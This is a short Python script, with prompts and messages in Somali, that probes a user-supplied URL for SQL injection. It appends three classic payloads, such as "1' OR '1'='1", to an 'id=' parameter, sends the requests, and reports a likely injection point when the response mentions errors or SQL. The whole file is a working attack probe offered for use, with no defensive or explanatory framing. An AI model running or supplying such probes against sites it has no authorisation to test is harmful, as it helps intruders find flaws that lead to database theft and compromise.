
import requests

url = input("Geli URL ay ku jirto 'id=' param: ")
payloads = ["1'", "1' OR '1'='1", "' OR 'a'='a"]

for payload in payloads:
    full_url = url + payload
    r = requests.get(full_url)
    if "error" in r.text or "SQL" in r.text:
        print(f"[!] Waxaa suurtagal ah SQLi: {full_url}")
    else:
        print(f"[-] No error at: {full_url}")
